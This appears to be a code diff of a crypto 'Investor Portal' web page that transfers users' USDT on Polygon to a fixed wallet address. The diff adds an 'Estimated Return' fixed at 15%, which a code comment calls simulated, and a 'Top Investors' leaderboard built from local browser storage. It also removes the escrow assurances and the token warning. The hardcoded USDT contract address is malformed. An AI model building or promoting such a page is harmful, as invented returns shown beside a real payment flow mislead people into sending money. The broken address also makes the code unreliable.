@@ -1,61 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <title>Investor Portal</title>
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
+<!-- ✅ 稳定 ethers -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
 <style>
-body {
-  margin:0;
-  background:#0b0f14;
-  color:white;
-  font-family:Arial;
-}
-
-.container {
-  max-width:700px;
-  margin:auto;
-  padding:20px;
-}
-
-.card {
-  background:#141a22;
-  padding:20px;
-  border-radius:12px;
-  margin-top:20px;
-}
-
-button {
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border:none;
-  border-radius:10px;
-  background:#00ffae;
-  font-weight:bold;
-  cursor:pointer;
-}
-
-input {
-  width:100%;
-  padding:10px;
-  margin-top:10px;
-  border:none;
-  border-radius:8px;
-}
-
-.status {
-  margin-top:10px;
-  font-size:14px;
-  color:#aaa;
-}
-
-.warning {
-  color:#ff7675;
-  font-size:13px;
-}
+body {margin:0;background:#0b0f14;color:white;font-family:Arial;}
+.container {max-width:700px;margin:auto;padding:20px;}
+.card {background:#141a22;padding:20px;border-radius:12px;margin-top:20px;}
+button {width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;background:#00ffae;font-weight:bold;}
+input {width:100%;padding:10px;margin-top:10px;border:none;border-radius:8px;}
+.status {margin-top:10px;color:#aaa;font-size:14px;}
+.rank {font-size:13px;margin-top:10px;}
 </style>
 </head>
 
@@ -66,60 +25,65 @@ input {
 <h2>🌍 Investor Portal</h2>
 
 <div class="card">
-<button onclick="connectWallet()">🔗 Connect Wallet</button>
-<div id="wallet"></div>
+<button onclick="connect()">🔗 Connect Wallet</button>
+<div id="wallet">Not connected</div>
 </div>
 
 <div class="card">
 <h3>💰 Invest (USDT - Polygon)</h3>
 
 <input id="amount" placeholder="Enter amount (e.g. 10)">
-
 <button onclick="invest()">🚀 Invest Now</button>
 
 <div class="status" id="status"></div>
-
-<div class="warning">
-⚠️ Only official USDT (Polygon) is accepted.<br>
-Other tokens will NOT be counted.
-</div>
-
 </div>
 
 <div class="card">
-<h3>📊 Investment History</h3>
-<div id="history">No records yet</div>
+<h3>📊 ROI Overview</h3>
+<div id="roi">No data</div>
 </div>
 
 <div class="card">
-<h3>🔐 Escrow Info</h3>
-<p>Funds are stored in a multisig Safe.</p>
-<p>No single party can move funds.</p>
+<h3>🏆 Top Investors</h3>
+<div id="rank">No data</div>
 </div>
 
 </div>
 
 <script>
 
-// ===== 配置 =====
+// ===== CONFIG =====
 const SAFE = "0xC8DF3B516616800b2709F66e1bee7520aBAbD4E2";
-
-// 官方 Polygon USDT
 const USDT = "0xC2132D05D31c914a87C6611C10748AaCBdA6C62";
 
-// ERC20 ABI
-const ERC20 = [
-  "function transfer(address to, uint256 amount) returns (bool)"
-];
-
-// ===== 状态 =====
 let provider, signer, user;
 
-// ===== 连接钱包 =====
-async function connectWallet(){
+// ===== AUTO CONNECT（关键升级）=====
+window.onload = async () => {
+
+  if(window.ethereum){
+    try{
+      provider = new ethers.BrowserProvider(window.ethereum);
+
+      let accounts = await provider.send("eth_accounts", []);
+
+      if(accounts.length > 0){
+        signer = await provider.getSigner();
+        user = await signer.getAddress();
+        updateWallet();
+      }
+    }catch{}
+  }
+
+  renderRank();
+  renderROI();
+}
+
+// ===== CONNECT =====
+async function connect(){
 
   if(!window.ethereum){
-    alert("Please install MetaMask");
+    alert("Install MetaMask");
     return;
   }
 
@@ -130,25 +94,29 @@ async function connectWallet(){
   signer = await provider.getSigner();
   user = await signer.getAddress();
 
-  document.getElementById("wallet").innerText =
-    "Connected: " + user;
+  updateWallet();
 }
 
-// ===== 网络检查 =====
-async function checkNetwork(){
+// ===== UI =====
+function updateWallet(){
+  document.getElementById("wallet").innerHTML =
+    `Wallet: ${user.slice(0,6)}...${user.slice(-4)}`;
+}
 
+// ===== NETWORK CHECK =====
+async function checkNetwork(){
   const network = await provider.getNetwork();
 
   if(network.chainId !== 137n){
-    alert("Please switch to Polygon network");
+    alert("Switch to Polygon");
     throw new Error("Wrong network");
   }
 }
 
-// ===== 投资 =====
+// ===== INVEST =====
 async function invest(){
 
-  try {
+  try{
 
     if(!signer){
       alert("Connect wallet first");
@@ -164,82 +132,88 @@ async function invest(){
       return;
     }
 
-    document.getElementById("status").innerText =
-      "⏳ Preparing transaction...";
+    document.getElementById("status").innerText = "Preparing...";
 
     const token = new ethers.Contract(
       USDT,
-      ERC20,
+      ["function transfer(address,uint256) returns(bool)"],
       signer
     );
 
-    let parsed = ethers.parseUnits(amount, 6);
-
-    document.getElementById("status").innerText =
-      "✍️ Confirm in wallet...";
+    let parsed = ethers.parseUnits(amount,6);
 
     let tx = await token.transfer(SAFE, parsed);
 
     document.getElementById("status").innerText =
-      "⛓ TX sent: " + tx.hash;
+      "TX sent: " + tx.hash;
 
     await tx.wait();
 
     document.getElementById("status").innerText =
       "✅ Investment confirmed";
 
-    // ===== 记录本地历史 =====
-    addHistory(user, amount, tx.hash);
+    saveInvestment(amount, tx.hash);
 
-  } catch(e){
+    // 🔥 自动返回 dashboard
+    setTimeout(()=>{
+      window.location.href = "index.html";
+    },1500);
 
-    console.error(e);
-
-    document.getElementById("status").innerText =
-      "❌ Error: " + e.message;
+  }catch(e){
+    document.getElementById("status").innerText = e.message;
   }
 }
 
-// ===== 本地记录（后续可换链上） =====
-function addHistory(user, amount, hash){
+// ===== STORAGE =====
+function saveInvestment(amount, hash){
 
-  let history = JSON.parse(localStorage.getItem("investments") || "[]");
+  let data = JSON.parse(localStorage.getItem("invest") || "[]");
 
-  history.push({
+  data.push({
     user,
-    amount,
+    amount: Number(amount),
     hash,
-    time: new Date().toLocaleString()
+    time: Date.now()
   });
 
-  localStorage.setItem("investments", JSON.stringify(history));
+  localStorage.setItem("invest", JSON.stringify(data));
 
-  renderHistory();
+  renderRank();
+  renderROI();
 }
 
-// ===== 渲染历史 =====
-function renderHistory(){
+// ===== RANK =====
+function renderRank(){
 
-  let history = JSON.parse(localStorage.getItem("investments") || "[]");
+  let data = JSON.parse(localStorage.getItem("invest") || "[]");
 
-  if(history.length === 0){
-    document.getElementById("history").innerText = "No records yet";
-    return;
-  }
+  let map = {};
 
-  document.getElementById("history").innerHTML =
-    history.map(h => `
-      <div style="margin-bottom:10px;">
-        ${h.amount} USDT<br>
-        <small>${h.user.slice(0,6)}...${h.user.slice(-4)}</small><br>
-        <small>${h.time}</small><br>
-        <a href="https://polygonscan.com/tx/${h.hash}" target="_blank">View TX</a>
-      </div>
-    `).join("");
+  data.forEach(d=>{
+    map[d.user] = (map[d.user] || 0) + d.amount;
+  });
+
+  let sorted = Object.entries(map).sort((a,b)=>b[1]-a[1]);
+
+  document.getElementById("rank").innerHTML =
+    sorted.map((i,index)=>`
+      ${index+1}. ${i[0].slice(0,6)}... : $${i[1]}
+    `).join("<br>") || "No data";
 }
 
-// 初始化
-renderHistory();
+// ===== ROI =====
+function renderROI(){
+
+  let data = JSON.parse(localStorage.getItem("invest") || "[]");
+
+  let total = data.reduce((a,b)=>a+b.amount,0);
+
+  let roi = total * 0.15; // 模拟15%
+
+  document.getElementById("roi").innerHTML =
+    `Total Invested: $${total}<br>
+     Estimated Return: $${roi.toFixed(2)}`;
+}
 
 </script>
 
